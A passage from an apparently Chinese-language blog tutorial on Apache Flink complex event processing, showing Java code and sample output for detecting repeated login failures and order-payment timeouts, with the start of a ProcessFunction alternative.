class="title">LoginFailWarning</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> LoginFailWarning <span class="title">select</span><span class="params">(Map&lt;String, List&lt;LoginEvent&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      LoginEvent firstFailEvent = pattern.get(<span class="string">&quot;failEvents&quot;</span>).get(<span class="number">0</span>);</span><br><span class="line">      LoginEvent lastFailEvent = pattern.get(<span class="string">&quot;failEvents&quot;</span>).get(pattern.get(<span class="string">&quot;failEvents&quot;</span>).size() - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> LoginFailWarning(firstFailEvent.getUserId(), firstFailEvent.getTimestamp(), lastFailEvent.getTimestamp(), <span class="string">&quot;login fail &quot;</span> + pattern.get(<span class="string">&quot;failEvents&quot;</span>).size() + <span class="string">&quot; times&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoginFailWarning&#123;userId=1035, firstFailTime=1558430842, lastFailTime=1558430844, warningMsg=&#x27;login fail 3 times&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="è®¢å•æ”¯ä»˜å®æ—¶ç›‘æ§"><a href="#è®¢å•æ”¯ä»˜å®æ—¶ç›‘æ§" class="headerlink" title="è®¢å•æ”¯ä»˜å®æ—¶ç›‘æ§"></a>è®¢å•æ”¯ä»˜å®æ—¶ç›‘æ§</h5><ul><li>åŸºæœ¬éœ€æ±‚ <ul><li>ç”¨æˆ·ä¸‹å•ä¹‹åï¼Œåº”è®¾ç½®è®¢å•å¤±æ•ˆäº‹ä»¶ï¼Œä»¥æé«˜ç”¨æˆ·æ”¯ä»˜çš„æ„æ„¿ï¼Œå¹¶é™ä½ç³»ç»Ÿé£é™©</li><li>ç”¨æˆ·ä¸‹å•å15åˆ†é’Ÿæœªæ”¯ä»˜ï¼Œåˆ™è¾“å‡ºç›‘æ§ä¿¡æ¯</li></ul></li><li>è§£å†³æ€è·¯ <ul><li>åˆ©ç”¨CEPåº“è¿›è¡Œäº‹ä»¶æµçš„æ¨¡å¼åŒ¹é…ï¼Œå¹¶è®¾å®šåŒ¹é…çš„æ—¶é—´é—´éš”</li><li>ä¹Ÿå¯ä»¥åˆ©ç”¨çŠ¶æ€ç¼–ç¨‹ï¼Œç”¨process functionå®ç°å¤„ç†é€»è¾‘</li></ul></li></ul><h6 id="POJO-5"><a href="#POJO-5" class="headerlink" title="POJO"></a>POJO</h6><ul><li><p> OrderEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long orderId;</span><br><span class="line"><span class="keyword">private</span> String eventType;</span><br><span class="line"><span class="keyword">private</span> String txId;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li><li><p> OrderResult  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Long orderId;</span><br><span class="line"><span class="keyword">private</span> String resultState;</span><br></pre></td></tr></table></figure></li><li><p> ReceiptEvent  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String txId;</span><br><span class="line"><span class="keyword">private</span> String payChannel;</span><br><span class="line"><span class="keyword">private</span> Long timestamp;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 1-CEPä»£ç å®ç°"><a href="#ä»£ç 1-CEPä»£ç å®ç°" class="headerlink" title="ä»£ç 1-CEPä»£ç å®ç°"></a>ä»£ç 1-CEPä»£ç å®ç°</h6><ul><li><p> pomä¾èµ–  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">  &lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.flink&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;flink-cep_$&#123;scala.binary.version&#125;&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;$&#123;flink.version&#125;&lt;/version&gt;</span><br><span class="line">  &lt;/dependency&gt;</span><br><span class="line">  &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></li><li><p> javaä»£ç <br>ï¼ˆå®é™…å¦‚æœå¤„ç†è¶…æ—¶è®¢å•ï¼Œåº”è¯¥ä¿®æ”¹å¯¹åº”çš„æ•°æ®åº“æ•°æ®ï¼Œå¥½è®©ä¸‹æ¬¡ç”¨æˆ·å†æ¬¡æ“ä½œè¶…æ—¶è®¢å•æ—¶å¤±æ•ˆï¼‰  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> beans.OrderResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.CEP;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternSelectFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternTimeoutFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.conditions.SimpleCondition;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 5:50 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPayTimeout</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ•°æ®å¹¶è½¬æ¢æˆPOJOç±»å‹</span></span><br><span class="line">    URL resource = OrderPayTimeout.class.getResource(<span class="string">&quot;/OrderLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;OrderEvent&gt; orderEventDataStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;OrderEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(OrderEvent element)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. å®šä¹‰ä¸€ä¸ªå¾…æ—¶é—´é™åˆ¶çš„æ¨¡å¼</span></span><br><span class="line">    Pattern&lt;OrderEvent, OrderEvent&gt; orderPayPattern = Pattern.&lt;OrderEvent&gt;begin(<span class="string">&quot;create&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;OrderEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(OrderEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;create&quot;</span>.equals(value.getEventType());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      .followedBy(<span class="string">&quot;pay&quot;</span>).where(<span class="keyword">new</span> SimpleCondition&lt;OrderEvent&gt;() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">filter</span><span class="params">(OrderEvent value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pay&quot;</span>.equals(value.getEventType());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      .within(Time.minutes(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. å®šä¹‰ä¾§è¾“å‡ºæµæ ‡ç­¾ï¼Œç”¨æ¥è¡¨ç¤ºè¶…æ—¶äº‹ä»¶</span></span><br><span class="line">    OutputTag&lt;OrderResult&gt; orderTimeoutTag = <span class="keyword">new</span> OutputTag&lt;OrderResult&gt;(<span class="string">&quot;order-timeout&quot;</span>) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. å°†patternåº”ç”¨åˆ°è¾“å…¥æ•°æ®ä¸Šï¼Œå¾—åˆ°pattern stream</span></span><br><span class="line">    PatternStream&lt;OrderEvent&gt; patternStream = CEP.pattern(orderEventDataStream.keyBy(OrderEvent::getOrderId), orderPayPattern);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. è°ƒç”¨selectæ–¹æ³•ï¼Œå®ç°å¯¹åŒ¹é…å¤æ‚äº‹ä»¶å’Œè¶…æ—¶å¤æ‚äº‹ä»¶çš„æå–å’Œå¤„ç†</span></span><br><span class="line">    SingleOutputStreamOperator&lt;OrderResult&gt; resultStream = patternStream</span><br><span class="line">      .select(orderTimeoutTag, <span class="keyword">new</span> OrderTimeoutSelect(), <span class="keyword">new</span> OrderPaySelect());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;payed normally&quot;</span>);</span><br><span class="line">    resultStream.getSideOutput(orderTimeoutTag).print(<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;order timeout detect job&quot;</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„è¶…æ—¶äº‹ä»¶å¤„ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderTimeoutSelect</span> <span class="keyword">implements</span> <span class="title">PatternTimeoutFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">OrderResult</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> OrderResult <span class="title">timeout</span><span class="params">(Map&lt;String, List&lt;OrderEvent&gt;&gt; pattern, <span class="keyword">long</span> timeoutTimestamp)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Long timeoutOrderId = pattern.get(<span class="string">&quot;create&quot;</span>).iterator().next().getOrderId();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> OrderResult(timeoutOrderId, <span class="string">&quot;timeout &quot;</span> + timeoutTimestamp);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„æ­£å¸¸åŒ¹é…äº‹ä»¶å¤„ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderPaySelect</span> <span class="keyword">implements</span> <span class="title">PatternSelectFunction</span>&lt;<span class="title">OrderEvent</span>, <span class="title">OrderResult</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> OrderResult <span class="title">select</span><span class="params">(Map&lt;String, List&lt;OrderEvent&gt;&gt; pattern)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Long payedOrderId = pattern.get(<span class="string">&quot;pay&quot;</span>).iterator().next().getOrderId();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> OrderResult(payedOrderId, <span class="string">&quot;payed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">payed normally&gt; OrderResult&#123;orderId=34729, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34767, resultState=<span class="string">&#x27;timeout 1558431249000&#x27;</span>&#125;</span></span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34766, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34765, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34764, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34763, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34762, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34761, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34760, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34759, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34758, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34757, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line"><span class="meta">timeout&gt;</span><span class="bash"> OrderResult&#123;orderId=34756, resultState=<span class="string">&#x27;timeout 1558431213000&#x27;</span>&#125;</span></span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34755, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34754, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34753, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34752, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34751, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34750, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34749, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34748, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34747, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34746, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34745, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34744, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34743, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34742, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34741, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34740, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34739, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34738, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34737, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34736, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34735, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34734, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34733, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34732, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34731, resultState=&#x27;payed&#x27;&#125;</span><br><span class="line">payed normally&gt; OrderResult&#123;orderId=34730, resultState=&#x27;payed&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="ä»£ç 2-ProcessFunctionå®ç°"><a href="#ä»£ç 2-ProcessFunctionå®ç°" class="headerlink" title="ä»£ç 2-ProcessFunctionå®ç°"></a>ä»£ç 2-ProcessFunctionå®ç°</h6><p>CEPè™½ç„¶æ›´åŠ ç®€æ´ï¼Œä½†æ˜¯ProcessFunctionèƒ½æ§åˆ¶çš„ç»†èŠ‚æ“ä½œæ›´å¤šã€‚</p><p>CEPè¿˜æ˜¯æ¯”è¾ƒé€‚åˆäº‹ä»¶ä¹‹é—´æœ‰å¤æ‚è”ç³»çš„åœºæ™¯ï¼›</p><p>ProcessFunctionç”¨æ¥å¤„ç†æ¯ä¸ªç‹¬ç«‹ä¸”é çŠ¶æ€å°±èƒ½è”ç³»çš„äº‹ä»¶ï¼Œçµæ´»æ€§æ›´é«˜ã€‚</p><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.OrderEvent;</span><br><span class="line"><span class="keyword">import</span> beans.OrderResult;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 4:59 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderTimeoutWithoutCep</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®šä¹‰è¶…æ—¶äº‹ä»¶çš„ä¾§è¾“å‡ºæµæ ‡ç­¾</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> OutputTag&lt;OrderResult&gt; orderTimeoutTag = <span class="keyword">new</span> OutputTag&lt;OrderResult&gt;(<span class="string">&quot;order-timeout&quot;</span>) &#123;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ•°æ®å¹¶è½¬æ¢æˆPOJOç±»å‹</span></span><br><span class="line">    URL resource = OrderPayTimeout.class.getResource(<span class="string">&quot;/OrderLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;OrderEvent&gt; orderEventDataStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> OrderEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;).assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">      <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;OrderEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) 